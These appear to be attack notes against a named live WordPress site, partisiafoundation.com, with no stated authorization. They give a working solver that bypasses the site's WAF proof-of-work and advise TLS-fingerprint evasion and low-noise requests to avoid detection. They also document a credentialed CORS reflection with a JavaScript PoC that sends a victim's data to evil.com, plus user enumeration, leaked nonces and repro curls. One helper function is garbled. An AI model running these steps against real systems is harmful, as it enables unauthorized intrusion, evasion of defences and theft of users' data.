# Partisia Foundation — WordPress + Simply.com WAF PoW + CORS Reflect (2026-08-15)

Target: `https://partisiafoundation.com` — claimed SPA, actually **WordPress 7.0.4 spoofed** (readme has no Version string, `wp-includes/version.php` → 455, generator meta is fake) + **Blocksy 2.1.48 + Elementor 4.1.4 / Pro 4.1.2 + WP Rocket + Yoast SEO Premium 28.0 + Wordfence + Simply.com WAF (PoW 454/455)**. Hunt 40min, 80+ single-req `Mozilla/5.0 Firefox/128.0`.

## 1. Simply.com WAF PoW 454 — extraction & bypass

**Challenge HTML** (`curl -A Mozilla -I` → `HTTP/2 454`):
```html
var T="53f50bf99b3244d26b69de74184d5905b9ff3ffa61e16127a42fb7136c7bc2da",TS="1786825030",D=16;
# worker SHA256(T:nonce) leading zeros >=D → POST /.sc-verify/ {ts,nonce,token} → {ok, cookie: sc_clearance}
# sets cookie: sc_clearance=...;path=/;max-age=86400;domain=partisiafoundation.com;SameSite=None;Secure
```

**Solver (pure python, no worker):**
```python
import hashlib, re, requests
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
sess=requests.Session(); sess.headers.update({"User-Agent":UA})
r=sess.get("https://partisiafoundation.com/")
T=re.search(r'var T="([a-f0-9]+)"',r.text).group(1); TS=re.search(r'TS="(\d+)"',r.text).group(1); D=int(re.search(r'D=(\d+)',r.text).group(1))
def lz(h): b=0; [exec("b+=4 if int(c,16)==0 else (b:=b+3) if int(c,16)<2 else (b:=b+2) if int(c,16)<4 else (b:=b+1)",{}) or exit() for c in h if int(c,16)!=0 or b+4] ; return b
# simpler:
def lz2(h):
    b=0
    for c in h:
        n=int(c,16)
        if n==0: b+=4
        else:
            if n<2: b+=3
            elif n<4: b+=2
            elif n<8: b+=1
            break
    return b
nonce=0
while True:
    h=hashlib.sha256(f"{T}:{nonce}".encode()).hexdigest()
    if lz2(h)>=D: break
    nonce+=1
r2=sess.post("https://partisiafoundation.com/.sc-verify/", data={"ts":TS,"nonce":str(nonce),"token":T}, headers={"Content-Type":"application/x-www-form-urlencoded","Referer":"https://partisiafoundation.com/","Origin":"https://partisiafoundation.com"})
# then sess.get("/") → 200
```

**TLS fingerprint bypass:** `curl -A Mozilla` → 454 challenge every time; `python requests -A Mozilla` (same UA, different JA3 / OpenSSL) → `200` with no challenge on same IP. WAF checks JA3, not UA. Use Mozilla UA with python/requests/fetch to bypass PoW low-noise. WAF still blocks `?s=<svg>`, `admin-ajax?action=wpforms_submit`, `/.env`, `xmlrpc.php` (403/455) but **CORS leaks through**.

## 2. CORS wildcard reflect + Allow-Credentials:true — HIGH

```bash
curl -s -A "Mozilla/5.0 ..." -H "Origin: https://evil.com" https://partisiafoundation.com/wp-json/wp/v2/pages -i | grep -i access-control
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# Vary: Origin,Accept-Encoding
```
Test on `GET /wp-json/`, `GET /wp-json/wp/v2/pages`, `GET /wp-json/elementor/v1/globals` (401 but header still reflects evil.com) + `OPTIONS`. Any origin reflected.

**Exfil PoC (evil.com JS, victim browser with session):**
```js
fetch("https://partisiafoundation.com/wp-json/wp/v2/pages?per_page=100",{credentials:"include"})
  .then(r=>r.json()).then(d=>fetch("https://evil.com/collect",{method:"POST",body:JSON.stringify(d)}));
```

**Fix:** whitelist explicit origins (`partisiafoundation.com`, `*.partisiablockchain.com`) not reflect. Never `ACAO: *` or reflect + `ACAC: true`.

## 3. WordPress REST enumeration (public vs blocked)

- `GET /wp-json/` → 200, dump 17 namespaces + routes
- `GET /wp-json/wp/v2/` → 200, 128 routes
- Public read 200: `/wp/v2/pages?per_page=100` (16), `/posts` (27), `/media/{id}` (50, iterate 9621,9620,9619,9600 → PDFs), `/search?search=test`, `/wp-sitemap.xml` family, `/author/yusef-fanous/`, `/feed/` (dc:creator leak)
- Blocked 401/404: `/users`, `/users/{id}`, `/users/me`, `/settings`, `/pages/6834/revisions`, `/comments?status`, `/fluent-snippets/snippets POST`, `/mcp/mcp-adapter-default-server`, `/elementor/v1/*`, `/wordfence/v1/authenticate POST`
- Leak via sitemap not REST: `author-sitemap.xml` → `yusef-fanous`, `admin` (REST users returns 404 invalid id). Always check sitemap+feed+HTML for author enum when REST blocked.

## 4. Inline config / nonce leak (view-source)

- `ct_localizations = {ajax_url, rest_url, search_url}` (Blocksy)
- `elementorFrontendConfig = {urls:{ajaxurl}, nonces:{floatingButtonsClickTracking:1c001fb859, atomicFormsSendForm:699bfb585c}}`
- `ElementorProFrontendConfig = {ajaxurl, nonce:b1ddf892b2, urls:{rest}}`
- WPForms `data-token="<REDACTED-FORM-NONCE>"` + `data-formid="8509"` + honeypot field `wpforms[fields][4]` (CSS hidden)
- `GET /wp-json/wordfence/v1/authenticate` → `{"nonce":"0f6e5b568e5ef1344bbbc9b8b8aac37ed2007df96bac8bad5ed33e8721ead6c2"}` anon 200

## 5. Security headers — only nosniff

`GET /` → `X-Content-Type-Options: nosniff` only; missing `Content-Security-Policy`, `X-Frame-Options` (→ clickjacking PoC `iframe get-in-touch` loads), `Strict-Transport-Security`, `Referrer-Policy`, `Permissions-Policy`, `Cross-Origin-Opener-Policy`. Include Warung analogy table.

## 6. Negative (prove not vuln)

- `/.env`, `/.git/HEAD`, `/wp-config.php(.bak)`, `/config.json`, `/debug.log` → 455/404
- `?s=<svg onload=alert(1)>` → 403, `{{7*7}}` reflects in `<title>` but encoded, not HTML exec
- `sourceMappingURL` none, Host injection `evil.com` → 410
- `POST /wp-json/mcp`, `/fluent-snippets`, `/batch/v1` → 401/403

## 7. Evidence bundle

- `homepage.html` 176k, `scripts.json` 17 bundles, `js/` downloaded, `chain_poc.html` clickjack, `report.md` VULN/ENTRY/CHAIN/IMPACT/POC/EVIDENCE + Warung table
- Single-req Mozilla UA throughout, sequential low-noise

## 8. Repro curls

```bash
# CORS
curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0" -H "Origin: https://evil.com" https://partisiafoundation.com/wp-json/wp/v2/pages -i | grep -i Access-Control
# Headers
curl -s -I -A "Mozilla/5.0 ..." https://partisiafoundation.com | grep -i "x-frame\|content-security\|strict-transport"
# User enum
curl -s -A "Mozilla/5.0 ..." https://partisiafoundation.com/author-sitemap.xml
curl -s -A "Mozilla/5.0 ..." https://partisiafoundation.com/wp-json/wordfence/v1/authenticate
```
